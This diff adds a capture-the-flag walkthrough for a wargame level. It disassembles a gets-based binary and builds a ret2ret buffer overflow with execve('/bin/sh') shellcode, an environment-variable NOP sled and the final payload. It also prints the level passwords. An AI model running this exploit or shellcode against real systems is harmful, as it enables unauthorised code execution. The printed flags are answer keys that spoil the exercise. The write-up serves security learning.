@@ -1,0 +1,166 @@
+login : pw
+	level2 : 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+gdb level2
+
+disas main
+	0x8048545 <main+6>              call   0x80484d4 <p>
+
+disas p
+	0x080484d7 <+3>:	sub    esp,0x68
+		=> Allocate 0x68 = 104 on stack
+	0x080484da <+6>:	mov    eax,ds:0x8049860
+		=> datasegment
+			=> x/s 0x8049860
+				=> stdout
+	0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
+		=> Flush stdout but just to make sure:
+			=> man fflush
+				=> Nothing
+	0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
+		=> int(0x4c) = 76
+	0x080484ed <+25>:	call   0x80483c0 <gets@plt>
+
+scp -P 4242 level2@192.168.1.20:~/level2 .
+
+bash gdb-peda.sh
+	=> gdb level2
+		=> pattern create 100
+		=> run
+			=> segfault: EIP: 0x41414a41 ('AJAA')
+		=> pattern offset AJAA
+			=> 80
+
+I tried the same method as before:
+	=> (skipping details)
+	=> python -c 'print "a" * 80 + "\x40\xf6\xff\xbf" + "\x90" * 100 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"' > /tmp/a
+	=> run < /tmp/a
+		=> (0xbffff640)
+		=> [Inferior 1 (process 10805) exited with code 01]
+	
+	=> After investigation:
+		We cant overwrite the ret instruction in gets due to the following check
+
+disas p
+	0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
+		=> puts supposed overwritten eip in eax
+	0x080484fb <+39>:	and    eax,0xb0000000
+		=> AND logical operator
+	0x08048500 <+44>:	cmp    eax,0xb0000000
+		=> Compared and-ed eax with 0xb0000000
+	0x08048505 <+49>:	jne    0x8048527 <p+83>
+		=> if they are not equal => jump to 0x8048527
+			=> Else call to printf with supposed eip then exit(1)
+	0x08048527 <+83>:	lea    eax,[ebp-0x4c]
+		=> Load effective address of supposed eip into eax
+	0x0804852a <+86>:	mov    DWORD PTR [esp],eax
+		=> Top of the stack points on supposed eip
+			=> Then puts()
+			=> Then same operation
+			=> Then strdup()
+
+0xb0000000 in binary gives 10110000000000000000000000000000
+0xf0000000 in binary gives 11110000000000000000000000000000
+	=> Both of them will enter the 0xb condition
+
+We need an EIP whose address doesnt start with 0xb or 0xf
+	Im aware about 2 buffer overflows method that could make the job
+		=> ret2ret / ret2libc
+
+Never tried a ret2ret so Ill go for this one first:
+	The idea is to take advantage of the ret asm instruction
+		=> A ret is pretty simple:
+			=> It pops the stack and put it in eip and jmp there
+		=> A ret2ret consists of overwriting an eip that points to another ret
+	
+python -c 'print "a" * 80 + "bbbb"' > /tmp/a
+	run < /tmp/a
+		=> segfault 0x62626262
+
+	x/100xw $esp - 100
+		=> Start address = 0xbffff5dc
+
+Lets try to launch the shell as soon as possible to avoid rewritten memory:
+	disas puts
+		=> require started program
+			0xb7e9291e <+318>:	ret
+				=> Address wont pass if test
+
+	disas strcpy
+		=> require started program
+			0xb7ea8a41 <+81>:	ret
+				=> Address wont pass if test
+
+	Dynamic linking ?
+
+disas p
+	=> 0x0804853e <+106>:	ret
+		=> breakpoint
+
+run < /tmp/a
+
+x/32xw 0xbffff5dc
+	=> Not altered
+
+continue
+	=> 6262.. segfault
+
+python -c 'print "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "a" * (80-55) + "bbbb"' > /tmp/a
+
+run
+
+x/32xw 0xbffff5dc
+	=> Not altered
+	=> We can see the b's
+
+Then instead of the b's I tried the ret address of the p function, which created an issue
+	=> It was working as intended but I was going back to the exact same instruction
+		=> it explodes
+
+disas main
+	0x0804854b <+12>:	ret
+ 
+b *main+12
+
+python -c 'print "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "a" * (80-55) + "\x4b\x85\x04\x08" + "eeee"' > /tmp/a
+
+run
+
+i r esp
+	=> 0xbffff630
+
+x 0xbffff630
+	=> 0x65656565
+		=> Should be won
+
+Lets put our buffer address instead
+
+python -c 'print "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "a" * (80-55) + "\x4b\x85\x04\x08" + "\xdc\xf5\xff\xbf"' > /tmp/a
+	=> Note that nopsled before and after would have been sexier, nevermind
+
+It was a success on gdb, so i tried outside:
+	it failed
+		=> Tried unset gdb env variables, laucnhing clean (env -i), nopsleds etc etc
+			=> Nothing worked
+
+My guess is I need a bigger nopsled to compensate memory variations
+	Lets try with an env variable
+	gdb:
+		env -i exploit=$(python -c 'print "\x90" * 10000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"') gdb level2
+		unset env LINES
+		unset env COLUMNS
+		Get exploit start address
+			start
+			info var environ
+				=> 0xb7fd2e04  environ
+			x/s *((char**)environ)
+				=> 0xbfffd869:	 "exploit=...
+			10000 * "\x90" => 0xbfffd869 + 5000 = 0xbfffebf1
+		python -c 'print  "a" * 80 + "\x4b\x85\x04\x08" + "\xf1\xeb\xff\xbf"' > /tmp/a
+			=> Works on gdb
+	shell:
+		env -i exploit=$(python -c 'print "\x90" * 10000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"') /home/user/level2/level2 < /tmp/a
+			=> shell started
+
+cat /home/user/level3/.pass
+	492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
